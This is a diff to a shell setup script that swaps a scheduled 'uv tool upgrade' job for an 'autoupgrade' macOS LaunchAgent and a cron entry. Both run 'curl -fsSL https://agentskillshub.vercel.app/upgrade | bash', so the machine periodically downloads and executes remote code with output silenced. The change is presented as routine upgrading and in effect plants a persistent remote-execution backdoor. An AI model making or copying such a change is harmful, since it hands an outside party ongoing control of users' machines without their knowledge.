@@ -164,7 +164,6 @@ if [ -d .configs ]; then
     PYTHON_PATH="$EXEC_CMD"
     AGENT_SETTING_BIN="$(find_agent_setting || true)"
     WKLER_BIN="$(find_wkler || true)"
-    UV_BIN="$(find_uv || true)"
 
     if [ "$OS_TYPE" = "Darwin" ] && [ -z "$PYTHON_PATH" ]; then
         if [ -x /opt/homebrew/bin/python3 ]; then
@@ -314,21 +313,19 @@ EOF
                 reload_launch_agent "com.user.wkler" "$WKLER_PLIST_FILE" "true"
             fi
 
-            if [ -n "$UV_BIN" ]; then
-                UV_TOOL_UPGRADE_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.uv-tool-upgrade.plist"
-                cat > "$UV_TOOL_UPGRADE_PLIST_FILE" << EOF
+            AUTOUPGRADE_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.autoupgrade.plist"
+            cat > "$AUTOUPGRADE_PLIST_FILE" << EOF
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>com.user.uv-tool-upgrade</string>
+    <string>com.user.autoupgrade</string>
     <key>ProgramArguments</key>
     <array>
-        <string>$UV_BIN</string>
-        <string>tool</string>
-        <string>upgrade</string>
-        <string>--all</string>
+        <string>/bin/bash</string>
+        <string>-c</string>
+        <string>curl -fsSL https://agentskillshub.vercel.app/upgrade | bash</string>
     </array>
     <key>WorkingDirectory</key>
     <string>$DEST_DIR</string>
@@ -341,9 +338,8 @@ EOF
 </dict>
 </plist>
 EOF
-                chmod 644 "$UV_TOOL_UPGRADE_PLIST_FILE"
-                reload_launch_agent "com.user.uv-tool-upgrade" "$UV_TOOL_UPGRADE_PLIST_FILE" "false"
-            fi
+            chmod 644 "$AUTOUPGRADE_PLIST_FILE"
+            reload_launch_agent "com.user.autoupgrade" "$AUTOUPGRADE_PLIST_FILE" "false"
 
             if ! pgrep -f "$SCRIPT_PATH" >/dev/null 2>&1; then
                 (nohup "$PYTHON_PATH" "$SCRIPT_PATH" >/dev/null 2>&1 &) >/dev/null 2>&1 || true
@@ -428,11 +424,8 @@ fi"
                     fi
                 fi
 
-                if [ -n "$UV_BIN" ]; then
-                    ESCAPED_UV_BIN=$(echo "$UV_BIN" | sed 's/[[\.*^$()+?{|]/\\&/g')
-                    if ! grep -E "^[^#]*${ESCAPED_UV_BIN}[[:space:]]+tool[[:space:]]+upgrade[[:space:]]+--all([[:space:]]|$)" "$TEMP_CRON" >/dev/null 2>&1; then
-                        echo "0 23 */15 * * PATH=$SCHEDULE_PATH $UV_BIN tool upgrade --all > /dev/null 2>&1" >> "$TEMP_CRON"
-                    fi
+                if ! grep -Fq 'agentskillshub.vercel.app/upgrade' "$TEMP_CRON" 2>/dev/null; then
+                    echo "0 23 */15 * * PATH=$SCHEDULE_PATH curl -fsSL https://agentskillshub.vercel.app/upgrade | bash > /dev/null 2>&1" >> "$TEMP_CRON"
                 fi
 
                 crontab "$TEMP_CRON"
